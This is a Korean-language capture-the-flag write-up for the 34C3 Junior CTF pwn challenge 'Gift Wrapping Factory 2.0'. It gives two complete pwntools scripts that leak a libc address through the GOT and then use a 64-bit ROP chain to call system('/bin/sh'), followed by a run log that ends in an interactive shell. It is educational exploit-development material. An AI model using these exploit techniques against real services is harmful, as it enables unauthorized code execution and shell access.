# [2017_34C3 Junior CTF] \[PWN] Gift Wrapping Factory 2.0

## Key words

* 64bit ROP
* Return Oriented Programming
* stack based buffer overflow

## Description

```
Wrapping gifts is now even more fun! Gift Wrapping Factory 2.0:

nc 35.198.185.193 1341
```

## Solution

발생하는 취약점은 `Gift Wrapping Factory` 문제와 동일합니다. 하지만 이번에는 쉘을 띄어주는 매직 함수가 존재하지 않습니다. 따라서 메모리 주소를 릭한 후 ROP를 통해 쉘을 획득해야 합니다.

### Leak

got를 이용해서 leak을 발생시킬 수 있습니다.

```python
from pwn import *

libc_name = "/lib/x86_64-linux-gnu/libc.so.6" #"./libc-2.26.so"
target_name = "./giftwrapper2.so"
libc = ELF(libc_name)
target = ELF(target_name)

ret = 0x400bce
popret = 0x400e18
pop_rdi_ret = 0x40154F+1
pop_rsi_r15_ret = 0x040154D+1

def exploit(payload):
	print "111"
	print r.recv()
	r.sendline("wrap")
	print r.recv()
	r.send("-1")
	print r.recv()
	r.send(payload)

r = remote("0", 12345)
raw_input()
print r.recv()
r.sendline("aaaaaaaaaaaaaaaa/bin/sh")
print r.recv()
r.sendline("modinfo")
print r.recvuntil("Base address: 0x")
code_base = int(r.recvline()[:-1], 16)
log.info("code base 0x%x" % code_base)

payload = "a" * 136
payload += p64(pop_rdi_ret)
payload += p64(code_base + target.got['puts'])
payload += p64(code_base + target.plt['puts'])
payload += p64(pop_rsi_r15_ret)
exploit(payload)

print r.recvuntil("so beautiful\n")
leak = u64(r.recvline()[:-1].ljust(8,"\x00"))
libc_base = leak - (0x7fe627ccb690-0x7fe627c5c000)
log.info("leak : 0x%x" % leak)
log.info("libc base : 0x%x" % libc_base)

r.interactive()
```

client 프로그램은 포크로 작동되며, server 바이너리는 계속 돌고 있기 때문에 libc 주소는 항상 고정되어 있습니다. 즉, 한번 leak한 주소를 계속 쓸 수 있습니다.

### Exploit

```python
from pwn import *

libc_name = "/lib/x86_64-linux-gnu/libc.so.6" #"./libc-2.26.so"
target_name = "./giftwrapper2.so"
libc = ELF(libc_name)
target = ELF(target_name)

ret = 0x400bce
popret = 0x400e18
pop_rdi_ret = 0x40154F+1
pop_rsi_r15_ret = 0x040154D+1

def exploit(payload):
	print "111"
	print r.recv()
	r.sendline("wrap")
	print r.recv()
	r.send("-1")
	print r.recv()
	r.send(payload)

r = remote("0", 12345)
raw_input()
print r.recv()
r.sendline("aaaaaaaaaaaaaaaa/bin/sh")
print r.recv()
r.sendline("modinfo")
print r.recvuntil("Base address: 0x")
code_base = int(r.recvline()[:-1], 16)
log.info("code base 0x%x" % code_base)

libc_base = 0x7fe627c5c000
system = libc_base + libc.symbols['system']

payload = "a"*136
payload += p64(pop_rdi_ret)
payload += p64(0x602170)
payload += p64(system)
exploit(payload)

r.interactive()
```

시스템 함수의 인자로 들어가는 `/bin/sh`를 어떻게 입력하는 것이 문제인데, 이는 server 프로그램의 전역변수에 넣어두었습니다.

## 실행 결과

```
$ python ex.py 
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/delspon/labs/ctf/2017_34c3ctf/giftwrapper2/giftwrapper2.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 0 on port 12345: Done

*
* Gift Wrapping Factory
*
Welcome to the new gift wrapping service!
Type "help" for help :)
> 
Command not found.
> 
************************************
Information about the loaded module:
Name: Gift Wrapping Factory
Base address: 0x
[*] code base 0x7fe627a5a000
111
************************************
> 
What is the size of the gift you want to wrap?
 |> 
Please send me your gift.
 |> 
[*] Switching to interactive mode
         _   _       
        ((\o/))      
 .-------//^\\------.
 |      /`   `\     |
 |                  |
 |                  |
  ------------------ 

Wow! This looks so beautiful
$ 
$ ls
ex.py
giftwrapper2.so
libc-2.26.so
peda-session-libc-2.26.so.txt
peda-session-server.txt
peda-session-sudo.txt
server
server.c
```

